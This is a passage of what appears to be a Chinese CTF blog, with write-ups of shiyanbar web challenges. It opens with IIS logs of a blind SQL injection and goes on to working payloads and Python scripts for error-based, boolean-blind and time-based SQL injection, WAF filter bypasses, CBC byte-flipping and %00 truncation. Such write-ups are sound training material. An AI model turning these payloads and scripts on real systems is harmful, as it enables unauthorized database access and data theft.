CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;50|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;49|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;100|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;98 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;99 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;53 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0 利用二分法一位一位分析，最后得到8位的ascii值 1234567891011121314151617&gt;&gt;&gt; chr(53)'5'&gt;&gt;&gt; chr(50)'2'&gt;&gt;&gt; chr(99)'c'&gt;&gt;&gt; chr(53)'5'&gt;&gt;&gt; chr(102)'f'&gt;&gt;&gt; chr(49)'1'&gt;&gt;&gt; chr(100)'d'&gt;&gt;&gt; chr(54)'6'&gt;&gt;&gt; 拼接得flag:52c5f1d6 花式绕waf扫描后台得到www.zip文件，获得源代码，考察sql注入","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"实验吧Web","slug":"实验吧Web","date":"2018-09-13T06:34:00.000Z","updated":"2018-09-17T12:35:12.755Z","comments":true,"path":"/posts/65109/","link":"","permalink":"https://Foxgrin.github.io/posts/65109/","excerpt":"实验吧Web题解","text":"实验吧Web题解 简单的登录题网址：http://ctf5.shiyanbar.com/web/jiandan/index.php burp抓包发现响应包头部tips:test.php test.php给出了index.php的源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpdefine(&quot;SECRET_KEY&quot;, &apos;***********&apos;); define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); error_reporting(0); include(&apos;conn.php&apos;); function sqliCheck($str)&#123; if(preg_match(&quot;/\\\\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123; return 1; &#125; return 0; &#125; function get_random_iv()&#123; $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv; &#125; function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher)); &#125; function show_homepage()&#123; global $link; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&quot;); $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; $rows=mysqli_fetch_array($result); echo &apos;Hello!&apos;.$rows[&apos;username&apos;].&apos;&apos;; &#125; else&#123; echo &apos;Hello!&apos;; &#125; &#125; else&#123; die(&quot;ERROR!&quot;); &#125; &#125; &#125; if(isset($_POST[&apos;id&apos;]))&#123; $id = (string)$_POST[&apos;id&apos;]; if(sqliCheck($id)) die(&quot;sql inject detected!&quot;); $info = array(&apos;id&apos;=&gt;$id); login($info); echo &apos;Hello!&apos;; &#125;else&#123; if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123; show_homepage(); &#125; else&#123; echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt; &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; &#125;&#125;?&gt; 审计代码，首先对我们post的参数id进行了sql语句关键词过滤，其中过滤了union，逗号，#，=，-，like，然后通过过滤后对数组plain进行cbc加密，加密后的值cipher和随机16位字符串iv存储在cookie对应的字段中，最终将cbc解密的id值执行sql语句 1select * from users limit \".$info['id'].\",0 可见，不管我们给id赋值1,2,3等，最终经过limit id,0后都得不到查询结果。我们要进行sql注入的话，就必须将后面的0注释掉，但是这里过滤掉了注释符#，–，所以用%00代替注释 给个payload:1;%00，通过burp先post id=1;%00，再将得到的cookie加入请求头的cookie字段，然后再访问，但是这里可能是php或者mysql修复了%00截断，因为直接输入1;%00依然无法实现截断 以下这段话参考别人的文章： %00截断并不是字面意义上的截断，而是指%00经过urldecode之后会变成空字符\\0，我们知道在c语言中\\0是字符串的结尾，所以\\0之后的字符就被截断了。所以，在本道题中不能直接输入1;%00，因为这样会被编码成1%3B%2500，需要用burpsuit抓包后修改为1%3B%00，然后再post才能成功截断。 试着post id=1%3B%00 成功得到用户名信息 那么我们继续执行注入，必须用到union，但是这里过滤了union，所以我们通过cbc字节翻转的方式，具体cbc字节翻转攻击原理就不具体说了，可以参考我之前的文章。此外，还过滤了逗号，那么我们可以用连接关键词join 下面直接给出payloads 注数据库名的payload:0 Anion select * from ((select 1)a join (select database())b join (select 3)c);%00 注表名的payload:0 Anion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c);%00 注列名的payload:0 Anion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=’you_want’)b join (select 3)c);%00 注数据的payload:0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);”%00 下面给出最后注出flag的脚本： 12345678910111213141516171819202122232425262728import requests,base64,urllib,reurl = \"http://ctf5.shiyanbar.com/web/jiandan/index.php\"data = &#123; 'id': \"0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);\"+chr(0)&#125;r1 = requests.post(url,data=data)cookies = requests.utils.dict_from_cookiejar(r1.cookies)cipher = base64.b64decode(urllib.unquote(cookies['cipher']))index = 7new_cipher = cipher[:index] + chr(ord(cipher[index])^ord('A')^ord('u')) + cipher[index+1:]new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))cookies['cipher'] = new_cipherr2 = requests.get(url,cookies=cookies)plain = base64.b64decode(re.findall(\"base64_decode\\('(.*)'\\)\",r2.text)[0])iv = base64.b64decode(urllib.unquote(cookies['iv']))target = 'a:1:&#123;s:2:\"id\";s:'new_iv = \"\"for i in range(16): new_iv = new_iv + chr(ord(iv[i])^ord(plain[i])^ord(target[i]))cookies['iv'] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=cookies)r3.encoding = r3.apparent_encodingprint r3.text 说明一下在python中chr(0)代表空字符的意思，而我们要进行截断都是通过空字符来截断 后台登录网址：http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php 源代码： 123456789$password=$_POST[&apos;password&apos;];$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;$result=mysqli_query($link,$sql);if(mysqli_num_rows($result)&gt;0)&#123; echo &apos;flag is :&apos;.$flag;&#125;else&#123; echo &apos;密码错误!&apos;;&#125; 对参数password进行了md5加密，看似不能进行sql注入，但是这里md5函数里出现参数true，查询一下md5参数加入了参数true，得到的是原始16位的二进制数 在本地测试了一下： 12345678&lt;?php$str = 'hello';echo md5($str,true);echo '&lt;br&gt;';echo md5($str);?&gt; 二进制数在浏览器上显示时会转化为字符串 所以我们进行注入的话，就必须要想办法让md5加密后是’or 6的形式 这里直接拿别人得到的字符串： ffifdyop 可以看到加密后的字符串为’or’6É]™é!r,ùíb\u001c 拼接到sql语句为 1SELECT * FROM admin WHERE username = 'admin' and password = '\".' or '6É]™é!r,ùíb.\"' 语句恒真，始终有查询结果，成功注出flag 加了料的报错注入网址：http://ctf5.shiyanbar.com/web/baocuo/index.php 源代码提示了需要post参数username和password 还给出了sql语句 1select * from users where username='$username' and password='$password' 使用万能密码登录admin用户,username=admin&amp;password=’ or ‘1 登录成功，但没有给出flag，说明要进行题目说的报错注入才能得到flag 尝试在username参数进行报错注入，但发现过了括号，注释符#，–，%3B%00 但是行注释符没有被过滤，我们可以通过行注释符注释掉中间的’ and password=’进行注入 得出payload: 1username=admin&apos; /*&amp;password=*/ or &apos; 拼接后相当于执行sql语句 1select * from users where username='admin' /*and password='*/ or '' 在本地数据库演示 那么使用在username中使用extract，在password中使用括号，再通过行注释符注释中间，最终拼接成完成的extractvalue注入，就是我们的目的 先注出数据库 payload: 1username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select database()),0x3a)) or &apos; 注表名 payload: 1username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x3a)) or &apos; 猜测flag可能在表ffll44jj中 注列名 payload: 1username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;),0x3a)) or &apos; 注数据 payload: 1username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj),0x3a)) or &apos; 获得flag 认真一点网址：http://ctf5.shiyanbar.com/web/earnest/index.php 输入id=1，页面返回You are in…，输入id等于其他值都返回You are not in，输入id=1’，返回You are not in，输入id=1”，返回You are in，猜测id可能被单引号包裹 那么我们可以根据返回信息的不同进行基于布尔的注入，但是经过测试，这题过滤了注释符，空格，逗号,substr，同时将or替换为空字符串，替换的解决方法是双写or绕过，过滤了空格可以用括号代替，substr用mid代替，过滤了逗号，可以用mid from for 给出脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import requestsurl = \"http://ctf5.shiyanbar.com/web/earnest/index.php\"all_string = '''qwertyuiopasdfghjklzxcvbnm `~1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:'\"\\|&lt;,&gt;.?/QWERTYUIOPASDFGHJKLZXCVBNM'''database = \"\"table_name = \"\"column_name = \"\"flag = \"\"#获取数据库名:ctf_sql_bool_blindfor i in range(1,100): f = 0 for j in all_string: print('checking '+j) data = &#123; 'id':\"0'oorr(ascii(mid((database())from(\"+str(i)+\")foorr(1)))=\"+str(ord(j))+\")oorr'0\" &#125; r = requests.post(url,data=data) if 'You are in ................' in r.text: print(\"The \"+str(i)+\" place of database is: \"+j) database = database + j f = 1 break if f == 0 and j == 'M': breakprint(\"database: \"+database)#获取数据表名:fiag,usersfor i in range(1,100): f = 0 for j in all_string: print('checking '+j) data = &#123; 'id':\"0'oorr(ascii(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(\"+str(i)+\")foorr(1)))=\"+str(ord(j))+\")oorr'0\" &#125; r = requests.post(url,data=data) if 'You are in ................' in r.text: print(\"The \"+str(i)+\" place of table_name is: \"+j) table_name = table_name + j f = 1 break if f == 0 and j == 'M': breakprint(\"table_name: \"+table_name)#获取fiag下列名:fL$4Gfor i in range(1,100): f = 0 for j in all_string: print('checking '+j) data = &#123; 'id':\"0'oorr(ascii(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag'))from(\"+str(i)+\")foorr(1)))=\"+str(ord(j))+\")oorr'0\" &#125; r = requests.post(url,data=data) if 'You are in ................' in r.text: print(\"The \"+str(i)+\" place of column_name is: \"+j) column_name = column_name + j f = 1 break if f == 0 and j == 'M': breakprint(\"column_name: \"+column_name)#获取数据:flag&#123;haha~you win!&#125;for i in range(1,100): f = 0 for j in all_string: print('checking '+j) data = &#123; 'id':\"0'oorr(ascii(mid((select(fL$4G)from(fiag))from(\"+str(i)+\")foorr(1)))=\"+str(ord(j))+\")oorr'0\" &#125; r = requests.post(url,data=data) if 'You are in ................' in r.text: print(\"The \"+str(i)+\" place of flag is: \"+j) flag = flag + j f = 1 break if f == 0 and j == 'M': breakprint(\"flag: \"+flag) 你真的会PHP吗网址：http://ctf5.shiyanbar.com/web/PHP/index.php 抓包发现响应包头部存在提示字段：hint: 6c525af4059b4fe7d8c33a.txt 访问得到源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&apos;number&apos;]))&#123; header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;); die(&quot;have a fun!!&quot;); &#125;foreach([$_POST] as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125; &#125; function is_palindrome_number($number) &#123; $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) &#123; if($number[$i] !== $number[$j]) &#123; return false; &#125; $i++; $j--; &#125; return true; &#125; if(is_numeric($_REQUEST[&apos;number&apos;]))&#123; $info=&quot;sorry, you cann&apos;t input a number!&quot;;&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123; $info = &quot;number must be equal to it&apos;s integer!! &quot;; &#125;else&#123; $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2)&#123; $info=&quot;no, this is not a palindrome number!&quot;; &#125;else&#123; if(is_palindrome_number($req[&quot;number&quot;]))&#123; $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; &#125;else&#123; $info=$flag; &#125; &#125;&#125;echo $info; 审计，整理思路，列出主要代码: 1234567891011121314151617181920212223242526272829&lt;?phpif(is_numeric($_REQUEST[&apos;number&apos;]))&#123; $info=&quot;sorry, you cann&apos;t input a number!&quot;;&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123; $info = &quot;number must be equal to it&apos;s integer!! &quot;; &#125;else&#123; $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2)&#123; $info=&quot;no, this is not a palindrome number!&quot;; &#125;else&#123; if(is_palindrome_number($req[&quot;number&quot;]))&#123; $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; &#125;else&#123; $info=$flag; &#125; &#125;&#125;?&gt; 1.首先必须POST参数number，然后得到关键参数$_REQUEST[‘number’]和$req[‘number’]，$req[‘number’]是通过数组POST遍历获得 2.$_REQUEST[‘number’]不能是一个数字字符串，且$req[‘number’]通过intval函数取整形值后再转换成字符串必须等于原本的$req[‘number’] 3.$req[‘number’]通过intval函数取整形值必须等于$req[‘number’]通过strrev函数取回文字符串后再通过intval函数取整形值 4.$req[‘number’]通过is_palindrome_number函数检测不能是一个回文数 首先考虑思路的第二步，不能是数字字符串，但是却取整形值后要等于原来的值，看似不可能，但是我们可以通过%00截断is_numeric函数 接下来考虑思路的第三步和第四步，前后检测是否为回文数明显矛盾，这里解决方法是利用intval函数的溢出 参考别人的题解里的一句话：intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。 通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件 所以赋值number=2147483647%00即可获得flag 我们可以在本地环境测试一下，给出我本地测试的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;flag&#123;xxxxxxxxxx&#125;&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_GET[&apos;number&apos;]))&#123; header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;); die(&quot;have a fun!!&quot;); &#125;foreach([$_GET] as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125; &#125; function is_palindrome_number($number) &#123; $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) &#123; if($number[$i] !== $number[$j]) &#123; return false; &#125; $i++; $j--; &#125; return true; &#125; echo &quot;\\$_REQUEST[&apos;number&apos;] = &quot;.$_REQUEST[&apos;number&apos;].&apos;&lt;br&gt;&apos;;echo &quot;\\$req[&apos;number&apos;] = &quot;.$req[&apos;number&apos;].&apos;&lt;br&gt;&apos;; echo &quot;is_numeric(\\$_REQUEST[&apos;number&apos;]) = &quot;.is_numeric($_REQUEST[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;echo &quot;intval(\\$req[&apos;number&apos;]): &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;echo &quot;\\$value1 = intval(\\$req[&apos;number&apos;]) = &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;echo &quot;strrev(\\$req[&apos;number&apos;]) = &quot;.strrev($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;echo &quot;\\$value2 = intval(strrev(\\$req[&apos;number&apos;])) = &quot;.intval(strrev($req[&quot;number&quot;])).&apos;&lt;br&gt;&apos;;if(is_numeric($_REQUEST[&apos;number&apos;]))&#123; $info=&quot;sorry, you cann&apos;t input a number!&quot;;&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123; $info = &quot;number must be equal to it&apos;s integer!! &quot;; &#125;else&#123; $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2)&#123; $info=&quot;no, this is not a palindrome number!&quot;; &#125;else&#123; if(is_palindrome_number($req[&quot;number&quot;]))&#123; $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; &#125;else&#123; $info=$flag; &#125; &#125;&#125;echo $info;?&gt; 赋值number=2147483647%00 执行结果如下： 可以看到%00成功截断了函数is_numeric，而intval函数会忽略%00，所以strval的值等于原来的值，思路的第二步成功 再看$req[‘number’]通过strrev函数处理的结果是7463847412，但是再经过intval函数处理结果依旧是原来的2147483647，这就是intval函数溢出，因为2147483647已经是最大值了，大于这个最大值的数经过intval函数处理都是2147483647，而2147483647经过is_palindrome_number函数处理一定返回false，因为它本来就不是回文数 最终获得的flag 登陆一下好吗??不要怀疑，我已经过滤了一切,还再逼你注入，哈哈哈哈哈! flag格式：ctf{xxxx} 解题链接：http://ctf5.shiyanbar.com/web/wonderkun/web/index.html 考察SQL注入，猜测后台SQL如下： 1select * from user where username='$username' and password='$password' 尝试使用： ‘=’ ，SQL语句就变成： 1select * from user where username=''='' and password=''='' 按照逻辑，从左往右： username=’’ 然后 ‘’=’’ 为真，password 也一样，类似下面： 所以我们账号和密码都填 ‘=’ ，即可获得flag。 who are you?我要把攻击我的人都记录db中去! 解题链接：http://ctf5.shiyanbar.com/web/wonderkun/index.php 发现题目会记录用户的IP地址，并记录到数据库中，那么我们就想到使用 HTTP 数据包头部的 X-Forwarded-For 字段伪造IP，进行 SQL 注入。尝试使用 payload ： 1’ and sleep(3) and ‘1 ，发现成功执行。 接下来，我们使用 payload ： 1’ and if(substr((select flag from flag),1,1),sleep(3),0) and ‘1 ，发现逗号被过滤了： 那么我们可以换成下面这种结构： 1’ and (select case when substr((select flag from flag) from 1 for 1)=’c’ then sleep(3) else 0 end) and ‘1 接下来编写脚本跑一下就行了： 1234567891011121314151617import requestsflag = ''url = \"http://ctf5.shiyanbar.com/web/wonderkun/index.php\"chars = \"0123456789abcdefghijklmnopqrstuvwxyz\"for i in range(1,50): for ch in chars: headers = &#123; \"X-Forwarded-For\" : \"1' and (select case when substr((select flag from flag) from %s for 1)='%s' then sleep(5) else 0 end) and '1\" % (i,ch) &#125; try: r = requests.get(url=url,headers=headers,timeout=5) except: flag += ch print(flag) if(ch == \"&#125;\"): exit() break 这题flag为：ctf{cdbf14c9551d5be5612f7bb5d2867853} 因为网络非常不稳定，直接给出flag。 简单的sql注入网址：http://ctf5.shiyanbar.com/423/web/ 注入点为id,数字型注入，过滤了注释符#，–+，id被单引号包裹 此外还过滤了 1union ,select ,order ,by ,table_schema,column_name,information_schema.columns 用行注释符代替空格，就不用去考虑过滤的问题，再想办法构造where ‘1，或者select 1 ‘ 闭合最后的单引号 爆数据库payload: 1?id=0%27/**/union/**/select/**/database()/**/%27 爆表payload: 